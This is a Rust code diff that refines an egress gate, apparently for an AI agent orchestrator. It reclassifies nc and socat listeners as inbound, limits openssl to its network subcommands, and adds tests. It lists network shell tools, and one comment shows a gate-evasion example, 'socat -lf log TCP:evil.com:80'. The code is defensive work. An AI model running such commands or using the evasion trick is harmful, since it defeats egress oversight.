@@ -1407,6 +1407,28 @@ fn remote_spec_target(bin: &str, args: &[String]) -> Option<Egress> {
     })
 }
 
+/// A listener is INBOUND — it binds a local port and has no destination.
+/// `nc -l 9000` previously handed the *port* to the gate as a hostname.
+fn is_listen_mode(bin: &str, args: &[String]) -> bool {
+    if !matches!(bin, "nc" | "ncat" | "netcat" | "socat") {
+        return false;
+    }
+    args.iter().any(|t| {
+        // `socat` spells listening in its address families (`TCP-LISTEN:`), and
+        // its `-l*` short flags are *logging* selectors (`-lf`, `-ly`, `-ls`) —
+        // reading those as "listen" would let `socat -lf log TCP:evil.com:80`
+        // slip the gate, so socat is matched on the address family only.
+        let short_cluster_l = bin != "socat"
+            && t.starts_with('-')
+            && !t.starts_with("--")
+            && t[1..].chars().any(|c| c == 'l' || c == 'L');
+        short_cluster_l
+            || t == "--listen"
+            || t.to_ascii_uppercase().contains("-LISTEN:")
+            || t.to_ascii_uppercase().starts_with("LISTEN:")
+    })
+}
+
 /// `nc`/`telnet`/`socat`/`ftp`: first non-flag token is the destination.
 fn raw_socket_host(bin: &str, args: &[String]) -> String {
     let Some(tok) = args
@@ -1416,6 +1438,11 @@ fn raw_socket_host(bin: &str, args: &[String]) -> String {
     else {
         return UNKNOWN_HOST.to_string();
     };
+    // A bare port is not a hostname: `nc -lvp 9000` used to reach the prompt as
+    // "would SEND DATA to: 9000". Kept as a backstop behind `is_listen_mode`.
+    if !tok.is_empty() && tok.bytes().all(|b| b.is_ascii_digit()) && tok.parse::<u16>().is_ok() {
+        return UNKNOWN_HOST.to_string();
+    }
     if tok.contains("://") {
         return split_url_host(tok).map_or_else(|| UNKNOWN_HOST.to_string(), |(_, h)| h);
     }
@@ -1447,6 +1474,39 @@ fn openssl_host(args: &[String]) -> String {
     UNKNOWN_HOST.to_string()
 }
 
+/// `openssl` is overwhelmingly a LOCAL crypto tool (`rand`, `dgst`, `genrsa`,
+/// `enc`); only a handful of subcommands open a socket. Treating the whole
+/// binary as egress ran ~14:1 false-positive on real usage and hard-refused
+/// local HMAC/keygen inside coordinators, so the network subcommands are
+/// allowlisted rather than defaulted-in.
+const OPENSSL_NET_SUBCOMMANDS: &[&str] = &["s_client", "s_server", "s_time", "ocsp", "ts"];
+
+fn openssl_target(args: &[String]) -> Option<Egress> {
+    // The first non-flag token is the subcommand.
+    match args
+        .iter()
+        .map(String::as_str)
+        .find(|t| !t.starts_with('-'))
+    {
+        Some(sub) if OPENSSL_NET_SUBCOMMANDS.contains(&sub.to_ascii_lowercase().as_str()) => {
+            Some(Egress {
+                host: openssl_host(args),
+                scheme: Some("tls".to_string()),
+                uploads: true,
+            })
+        }
+        // A recognized local subcommand: no socket, not egress.
+        Some(_) => None,
+        // No subcommand at all — bare `openssl` is an interactive REPL that can
+        // reach `s_client`. Fail SAFE and keep classifying it.
+        None => Some(Egress {
+            host: UNKNOWN_HOST.to_string(),
+            scheme: Some("tls".to_string()),
+            uploads: true,
+        }),
+    }
+}
+
 /// Classify a *already-unwrapped* argv's network destination. `None` when the
 /// binary crosses no network boundary (or, for `rsync`/`scp`, when both paths
 /// are local).
@@ -1472,16 +1532,18 @@ pub(crate) fn egress_target(bin: &str, args: &[String]) -> Option<Egress> {
             uploads: true,
         },
         "scp" | "sftp" | "rsync" | "rclone" => return remote_spec_target(&bin, args),
-        "nc" | "ncat" | "netcat" | "telnet" | "socat" | "ftp" | "tftp" | "lftp" => Egress {
-            host: raw_socket_host(&bin, args),
-            scheme: None,
-            uploads: true,
-        },
-        "openssl" => Egress {
-            host: openssl_host(args),
-            scheme: Some("tls".to_string()),
-            uploads: true,
-        },
+        "nc" | "ncat" | "netcat" | "telnet" | "socat" | "ftp" | "tftp" | "lftp" => {
+            // A listener is inbound: it binds a local port, it has no destination.
+            if is_listen_mode(&bin, args) {
+                return None;
+            }
+            Egress {
+                host: raw_socket_host(&bin, args),
+                scheme: None,
+                uploads: true,
+            }
+        }
+        "openssl" => return openssl_target(args),
         _ => Egress {
             host: UNKNOWN_HOST.to_string(),
             scheme: None,
@@ -8867,6 +8929,89 @@ mod egress_tests {
     }
 
     #[test]
+    fn egress_openssl_local_crypto_not_egress() {
+        // 15 openssl invocations in this machine's history; exactly one opens a
+        // socket. The other 14 must neither prompt nor be refused.
+        for argv in [
+            vec!["rand", "-hex", "32"],
+            vec!["rand", "-hex", "16"],
+            vec!["dgst", "-sha256", "-hmac", "k", "-hex"],
+            vec!["genrsa", "-out", "oidc_private_key.pem", "2048"],
+            vec!["enc", "-aes-256-cbc", "-in", "a", "-out", "b"],
+            vec!["x509", "-in", "c.pem", "-text"],
+        ] {
+            let args = a(&argv);
+            assert!(
+                egress_target("openssl", &args).is_none(),
+                "local openssl must not be egress: {argv:?}"
+            );
+            assert!(!is_egress("openssl", &args), "{argv:?}");
+        }
+        // The regression that mattered: the orchestrator's HMAC flow was being
+        // hard-refused inside a coordinator, so it could not run nested.
+        assert!(egress_refusal(true, "openssl", &a(&["dgst", "-sha256"])).is_none());
+    }
+
+    #[test]
+    fn egress_openssl_network_subcommands_still_class() {
+        assert_eq!(
+            egress_target("openssl", &a(&["s_client", "-connect", "h.com:443"]))
+                .unwrap()
+                .host,
+            "h.com"
+        );
+        assert_eq!(
+            egress_target("openssl", &a(&["s_client", "-connect=h.com:443"]))
+                .unwrap()
+                .host,
+            "h.com"
+        );
+        // bare `openssl` is an interactive REPL that can reach `s_client`
+        let bare = egress_target("openssl", &[]).expect("bare openssl stays classified");
+        assert_eq!(bare.host, UNKNOWN_HOST);
+        assert!(is_egress("openssl", &[]));
+    }
+
+    #[test]
+    fn egress_listener_not_egress() {
+        for argv in [
+            vec!["-l", "9000"],
+            vec!["-lvp", "9000"],
+            vec!["-k", "-l", "8080"],
+        ] {
+            let args = a(&argv);
+            assert!(
+                egress_target("nc", &args).is_none(),
+                "{argv:?} binds a local port — inbound"
+            );
+            assert!(!is_egress("nc", &args), "{argv:?}");
+        }
+        let sl = a(&["TCP-LISTEN:9000,fork", "-"]);
+        assert!(egress_target("socat", &sl).is_none());
+        assert!(!is_egress("socat", &sl));
+        // outbound sockets are untouched
+        assert_eq!(
+            egress_target("nc", &a(&["h.com", "9000"])).unwrap().host,
+            "h.com"
+        );
+        assert!(is_egress("nc", &a(&["h.com", "9000"])));
+        assert_eq!(
+            egress_target("socat", &a(&["-", "TCP:h.com:80"]))
+                .unwrap()
+                .host,
+            "h.com"
+        );
+        assert!(is_egress("socat", &a(&["-", "TCP:h.com:80"])));
+        // …and socat's `-l*` logging flags are not listen mode
+        assert!(is_egress("socat", &a(&["-lf", "log", "TCP:h.com:80"])));
+        // loopback stays exempt
+        assert!(!is_egress("nc", &a(&["127.0.0.1", "9000"])));
+        // a bare port is never accepted as a hostname
+        assert_eq!(raw_socket_host("nc", &a(&["9000"])), UNKNOWN_HOST);
+    }
+
+    #[test]
+
     fn egress_localhost_exempt() {
         for url in [
             "http://localhost:3000/x",
